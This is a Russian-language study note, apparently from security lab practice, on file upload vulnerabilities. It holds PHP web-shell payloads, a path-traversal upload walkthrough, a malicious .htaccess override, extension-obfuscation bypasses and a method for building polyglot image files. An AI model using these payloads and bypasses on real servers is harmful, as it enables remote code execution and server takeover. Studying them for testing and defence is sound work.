[[0Определение File upload vulnerabilities]] - карта раздела

---
## Оглавление
[[#Как веб-сервера обрабатывают запросы к статическим файлам]]
[[#Некорректная валидация типа файла - Flawed file type Validation]]
[[#Использование загрузки файлов для развертывания web-shell с заменой типа файла]]
[[#Предотвращение исполнения файлов в каталогах доступных пользователю]]
[[#Пример обхода пути]]
[[#Черные списки загружаемых файлов, возможный обход]]
[[#Переопределение конфигурации сервера]]
[[#Пример переопределения конфигурации]]
[[#Обфускация расширений файлов]]
[[#Ошибочная проверка содержимого файла]]

---

> [!info] 
> На обычных веб сайтах редко встречаются какие либо ограничения на то какие файлы разрешено загружать пользователям, чаще всего разработчики внедряют то что они считают надежной проверкой, которая либо изначально содержит недостатки либо может быть легко обманута

**Пример:**
Разработчик может внести в черный список опасные типы файлов, но можно легко пропустить более непонятные типы файлов которые все еще могут представлять опасность

Так же веб приложение может проверить тип файла, проверяя свойства, которыми злоумышленник может легко манипулировать с помощью Burp или Caido

Даже самые надежные меры могут применяться не согласованно во всей сети хостингов и каталогов, составляющих вебсайт что приводит к расхождениям которыми можно пользоваться 

#### Как веб-сервера обрабатывают запросы к статическим файлам
Когда клиент (например, браузер) делает HTTP-запрос к серверу, сервер:
- Сначала **анализирует путь (path) файла** в запросе.
- Извлекает **расширение файла** (`.html`, `.php`, `.jpg` и т. д.).
- Использует **преднастроенную таблицу соответствия расширений и MIME-типов** (например, `.html` → `text/html`, `.jpg` → `image/jpeg`, `.php` → `application/x-httpd-php`)
Далее от типа файла и конфигурации сервера делится на исполняемые и неисполняемые
	**Неисполняемые файлы:**
		Пример: `.html`, `.css`, `.jpg`, `.png`
		Если считается неисполняемым то читает файл и отправляет его клиенту как есть в HTTP ответе
	**Исполняемые файлы**
		Пример: `.php`, `.cgi`, `.jsp`, `.asp`
		Если сервер настроен выполнять такие файлы, то он устанавливает переменный окружения(например из query-параметров и заголовков запроса) 
		Запускает скрипт
		Отправляет клиенту результат выполнения скрипта 
	**Ошибочная обработка исполняемых файлов**
		Если сервер не настроен правильно для выполнения исполняемых файлов
		Он может отдать содержимое как текст, заместо его исполнения, это утечка исходного кода, которая является уязвимостью, называется `Infornation Disclousure` (раскрытие информации)

> [!note] Заголовок Content-Type
> Заголовок показывает в ответе сервера, какой тип файла(MIME-type) был отправлен
> Если сервер сам не указывал его вручную то он будет выставлен автоматически на основе расширения файла
```HTTP
Пример:
Content-Type: text/html
или
Content-Type: application/x-httpd-php
```

---
#### Некорректная валидация типа файла - Flawed file type Validation
Когда мы загружаем файл через `HTML`  форму например изображение, то браузер отправляет запрос в формате `multipart/form-data` это разбивает тело запроса на части где каждая часть представляет одно поле формы, то есть, файл текст и т.д.
В уязвимой системе сервер доверяет `Content-Type` указанному в `multipart-запросе` вместо того чтобы самому проверить содержимое файла, это позволяет злоумышленнику обмануть сервер загрузив вредоносный файл и это позволяет злоумышленнику обмануть сервер загрузи вредоносный файл
Пример
```HTTP
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345 
Content-Type: multipart/form-data;
boundary=-012345678901234567890123456 ---------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="example.jpg"
Content-Type: image/jpeg 
[...binary content of example.jpg...]
 ----------012345678901234567890123456
Content-Disposition: form-data; name="description"
This is an interesting description of my image. ---------------------------012345678901234567890123456
Content-Disposition: form-data; name="username"
 wiener
---------------------------012345678901234567890123456--
```

По факту если переименовать PHP-скрипт в `.jpg` установить `Content-Type: image/jpeg` загрузить вебшел файл и если сервер не проверяет содержимое и каталог загрузки является исполняемым то злоумышленник получит `RCE` 

---
#### Использование загрузки файлов для развертывания web-shell с заменой типа файла

> [!note] Web-Shell
>Это скрипт который позволяет исполнять произвольные команды, через HTTP запросы
>При успешной загрузке оболочки мы получаем полный контроль над сервером в рамках того пользователя от которого запущен доступ

> [!exploit] Примеры эксплоитов
```
<?php echo file_get_contents('/путь/к/целевому/файлу'); ?> - позвлит получить содержимое целевого файла
==========================
<?php echo system($_GET['command']); ?> - позволяет передать системную команду через HTTP для ее исполнения на сервере
GET /example/exploit.php?command=id HTTP/1.1 - так будет выглядеть пример запроса
```

---
#### Предотвращение исполнения файлов в каталогах доступных пользователю

В качестве меры предосторожности используют  только те скрипты MIME-тип которых был явно настроен для выполнения, в противном случае они либо выдают ошибку либо просто вывести содержимое файла

> [!info] Пример
```HTTP
GET /static/exploit.php?command=id HTTP/1.1 
Host: normal-website.com 

HTTP/1.1 200 OK 
Content-Type: text/plain 
Content-Length: 39 

<?php echo system($_GET['command']); ?>
```

Такое поведение может привести к утечке исходного кода, но сводит на нет любые попытки создать `web-shell`. Такой тип конфигурации часто разный между директориями, то есть в директории в которую пользователь может загружать файлы имеет более строгий контроль чем другие директории в файловой системе, отсюда рождается идея что если загрузить файл в другую директорию то сервер сможет исполнить ваш скрипт

> [!tip] Обрати внимание!
> Веб серверы используют поле имени  файла в multipart/form-data в запросах для определения имени и места где файл должен быть сохранен

> [!warning] ВАЖНО!
>Хотя мы отправляем наши запросы на одно доменное имя это часто указывает на какой либо прокси сервер, такой как балансировщик нагрузки и запросы могут обрабатываться разными серверами которые могут быть настроены по разному!

---
#### Пример обхода пути
В лабораторной работе необходимо загрузить файл в другую директорию и забрать секрет, я буду создавать веб шел для начала просто заменим в запросе имя на `../shell.php` потому что файл который мы загружаем загружается в `files/avatars/` и при этом папка не исполняемая, пробуем `../shell.php` 
```
POST /my-account/avatar HTTP/1.1
...
------WebKitFormBoundarydnQowihfAQAhUbBV
Content-Disposition: form-data; name="avatar"; filename="../shell.php"
Content-Type: application/x-php
...


HTTP/1.1 200 OK
...
The file avatars/shell.php has been uploaded.
```
получили то что сервер чистит имя файла от странных символов которые позволяют загрузить файл в другое место, попробуем закодировать в URL
```
POST /my-account/avatar HTTP/1.1
...
------WebKitFormBoundarydnQowihfAQAhUbBV
Content-Disposition: form-data; name="avatar"; filename="..%2Fshell.php"
Content-Type: application/x-php
...


HTTP/1.1 200 OK
...
The file avatars/../shell.php has been uploaded.
```
в этом случае мы уже загрузили наш файл на каталог выше, тогда делаем `GET` до пути нашего файла в моем случае это `/files/shell.php`(потому что-то путь до основной папки выглядит следующим образом: `/files/avatars/Photo` )  и получаем наш `web-shell` 

---
#### Черные списки загружаемых файлов, возможный обход

> [!info] 
> Один из способ борьбы с загрузкой потенциально опасных файлов является создание черного списка расширений, но их можно обойти если использовать альтернативные расширения файлов которые все еще могут быть исполняемыми, такие как .php5, .shtml и так далее

---
#### Переопределение конфигурации сервера 
Обычно сервера не хотят исполнять файлы если их конфигурация не позволяет это сделать, например `Apache` будет исполнять `php` файлы только если разработчик добавит в файл `/etc/apache2/apache2.conf` следующее
```
LoadModule php_module /usr/lib/apache2/modules/libphp.so
AddType application/x-httpd-php .php
```
Так же многие серверы позволяют разработчикам создавать специальные файлы конфигурации в отдельных каталогах, чтобы переопределить или дополнить одну или несколько глобальных настроек, серверы `Apache` загружают конфигурацию относящуюся к конкретному каталогу из файла с именем `.htaccess` если такой существует 
Похожим образом разработчики могут настраивать каталог и в `IIS`(Internet Information Services - веб сервера от Microsoft), они используют `web.config` файлы, это может включать в себя разные параметры например обработка файлов `.json` 
```
<staticContent>
 <mimeMap fileExtension=".json" mimeType="application/json" />
  </staticContent>
```
Веб серверы используют такие файлы когда они есть, но обычно нам не разрешается получать к ним доступ с помощью http-запросов, но мы можем загрузить свой файл конфигурации чтобы заставить сервер исполнять нужные нам файлы, то есть если расширение нашего файла занесено в черный список мы можем его обмануть

---
#### Пример переопределения конфигурации
нужно загрузить новую конфигурацию директории для сервера apache, по факту используем разрешение файла `.htaccess`, в нем я прописал следующее
```
php_flag engine on
AddType application/x-httpd-php .php .jpg
```
Содержимое значит что, если `php` неисполняемые мы во первых включим его исполнение а потом скажем чтобы сервер исполнял файлы `.php` и `.jpg`  как `php` в конечном итоге загружаем наш `shell.jpg` с содержимым шела на `php` и получаем веб шел

---
#### Обфускация расширений файлов
Даже самые обширные черные списки можно обойти используя  классику обфускации, например, код проверки чувствителен к регистру и не распознает файл `exploit.pHp`, но по факту это все тот же `.php` файл, если код который потом сопоставляет расширение файла с типом MIME не учитывает регистр то это несовпадение дает возможность загрузить вредоносные файлы
Так же можно указать несколько расширений в зависимости от алгоритма который используется для анализа имени файла, следующий файл может быть интерпретирован как `php` файл или изображение в формате `jpg`: `exploit.php.jpg`, можно так же добавить некоторые символы, некоторые компоненты будут удаляться или игнорироваться, например завершающие пробелы и точки: `shell.php.` 
Можно так же попробовать URL кодирование или двойное URL кодирование, для точек, слешей. Если значение не расшифровывалось при проверке расширения, но позже было расшифровано, то это может помочь загрузить вредоносный файл, которые в ином случае были бы заблокированы: `shell%2Ephp` 
Добавьте точку запятой или символы 0байта закодированные в URL, перед расширением и если проверка написана на языке высокого уровня по типу `php` и `java`, но сервер обрабатывает файл используя функции например на `C/C++`, это может привести к расхождениям в том как обрабатывается конец файла, например: `exploit.asp;.jpg` или `exploit.asp%00.jpg` 
Так же можно использовать многобайтовые символы Unicode, которые могут быть преобразованы в нулевые байты и точки после преобразования или нормализации Unicode. Последовательности `xC0 x2E`, `xC4 xAE` или `xC0 xAE` могут быть преобразованы в x2E если имя файла обрабатывается как строка UTF-8, но затем преобразуется в ASCII перед использованием в пути 
Еще способы зашиты включают удаление или замену опасных расширений, чтобы предотвратить запуск файла, если это преобразование не рекурсивно то можем расположить запрещенную строчку таким образом чтобы после удаления оставалось нужное нам расширение, например: `shell.p.phphp` 

---
#### Ошибочная проверка содержимого файла

Так как заголовок `Content-Type` полностью контролируется клиентом, то клиент может указать любой тип `image/jpg`, `image/png` независимо от реального содержимого, поэтому доверие `Content-Type` не является безопасным
Более надежно-защищенные сервера анализируют реальное содержимое файла и проверяют соответствует ли оно реальному типу.
Проверка для image upload может быть проверкой чтения как изображения, попытаться определить ширину высоту корректность формата, логика в том что скрипты размеров не имеют поэтому загрузку следует отклонить.
`Magic bytes`  некоторые форматы файлов в самом начале всегда содержат фиксированную последовательность байт в начале или в конце файла и эти файлы используются как сигнатура для типа файлов, например `JPEG: FF D8 FF` это надежно но ее можно обойти с помощью `Polyglot-файла`, который корректно распознается как изображение и одновременно содержит вредоносный код, инструменты такие как `ExifTool` позволяют редактировать metadata внедрять произвольный код, не ломая формат изображения файла
 Пример создания такого файла
 ```
 cp imageNamed.jpg example.jpg
 cat shell.php >> example.jpg
 ```
 файл создастся с кодом в конце так же можно использовать `ExifTool` для создания комментария и потом сохранения в виде с разрешением php
